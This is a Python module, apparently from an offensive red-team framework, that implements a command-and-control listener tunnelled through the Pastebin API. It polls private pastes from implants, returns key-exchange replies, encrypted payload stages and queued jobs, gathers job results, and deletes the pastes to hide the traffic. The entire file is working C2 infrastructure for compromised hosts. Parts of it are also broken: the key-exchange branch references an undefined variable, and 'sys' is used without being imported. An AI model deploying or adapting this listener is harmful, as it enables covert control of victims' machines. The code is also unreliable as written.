import requests
import logging
import core.state as state
import core.events as events
import defusedxml.ElementTree as ET
from time import sleep
from uuid import UUID
from base64 import b64decode, b64encode
from core.listener import Listener
from core.utils import gen_random_string, print_good, print_bad, PastebinPaste


class STListener(Listener):
    def __init__(self):
        Listener.__init__(self)
        self.name = 'pastebin'
        self.author = '@byt3bl33d3r'
        self.description = 'C2 over Pastebin API (not hooked up client side yet)'

        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name': {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'pastebin'
            },
            'APIKey': {
                'Description'   :   'Pastebin API Key',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Username': {
                'Description'   :   'Pastebin username',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Password': {
                'Description'   :   'Pastebin password',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CheckInterval': {
                'Description'   :   'Interval in seconds to check for agent pastes',
                'Required'      :   True,
                'Value'         :   10
            },
            'Comms': {
                'Description'   :   'C2 Comms to use',
                'Required'      :   True,
                'Value'         :   'pastebin'
            }
        }

    def login(self):
        post_data = {
            "api_dev_key": self["APIKey"],
            "api_user_name": self["Username"],
            "api_user_password": self["Password"]
        }

        r = requests.post("https://pastebin.com/api/api_login.php", data=post_data)
        if r.status_code == 200:
            return r.text

    def list_pastes(self, api_user_key):
        post_data = {
            "api_option": "list",
            "api_dev_key": self["APIKey"],
            "api_user_key": api_user_key,
            "api_results_limit": 5
        }

        r = requests.post("https://pastebin.com/api/api_post.php", data=post_data)
        if r.status_code == 200:
            return [PastebinPaste(paste) for paste in r.text.strip().split("</paste>")[:-1]]

    def create_paste(self, api_user_key, GUID, operation, data):
        post_data = {
            "api_option": "paste",
            "api_paste_private": 2,
            "api_paste_expire_date": "10M",
            "api_paste_format": "text",
            "api_paste_name": f"{GUID}:{operation}:server",
            "api_dev_key": self["APIKey"],
            "api_user_key": api_user_key,
            "api_paste_code": data
        }

        r = requests.post("https://pastebin.com/api/api_post.php", data=post_data)
        if r.status_code == 200:
            return r.text

    def get_paste(self, api_user_key, paste_key):
        post_data = {
            "api_option": "show_paste",
            "api_dev_key": self["APIKey"],
            "api_user_key": api_user_key,
            "api_paste_key": paste_key
        }

        r = requests.post("https://pastebin.com/api/api_raw.php", data=post_data)
        if r.status_code == 200:
            return r.text

    def delete_paste(self, api_user_key, paste_key):
        post_data = {
            "api_option": "delete",
            "api_dev_key": self["APIKey"],
            "api_user_key": api_user_key,
            "api_paste_key": paste_key
        }

        r = requests.post("https://pastebin.com/api/api_post.php", data=post_data)
        if r.status_code == 200:
            return True

    def run(self):

        api_user_key = self.login()

        while True:
            pastes = self.list_pastes(api_user_key)

            for paste in pastes:
                try:
                    GUID, operation, creator = paste.title.split(":")
                    GUID = UUID(GUID)

                    if creator == 'client':

                        if operation == 'kex':
                            paste_data = self.get_paste(api_user_key, paste.key)

                            pub_key = self.dispatch_event(events.KEX, (GUID, "pastebin.com", b64decode(data)))
                            self.create_paste(api_user_key, GUID, operation, b64encode(pub_key))

                            self.delete_paste(api_user_key, paste.key)

                        elif operation == "stage":
                            stage_file = self.dispatch_event(events.ENCRYPT_STAGE, (self["Comms"], GUID, "pastebin.com"))
                            if stage_file:
                                self.dispatch_event(events.SESSION_STAGED, f'Sending stage ({sys.getsizeof(stage_file)} bytes) ->  pastebin.com ...')
                                self.create_paste(api_user_key, GUID, operation, b64encode(stage_file))

                                self.delete_paste(api_user_key, paste.key)

                        elif operation == "jobs":
                            job = self.dispatch_event(events.SESSION_CHECKIN, (GUID, "pastebin.com"))
                            if job:
                                self.create_paste(api_user_key, GUID, operation, b64encode(job))

                            self.delete_paste(api_user_key, paste.key)

                        elif operation == "job_results":
                            paste_data = self.get_paste(api_user_key, paste.key)
                            job_id, data = paste_data.split(":")

                            self.dispatch_event(events.JOB_RESULT, (GUID, job_id, b64decode(data)))

                            self.delete_paste(api_user_key, paste.key)

                except ValueError:
                    logging.debug("Invalid UUID")

            sleep(int(self['CheckInterval']))
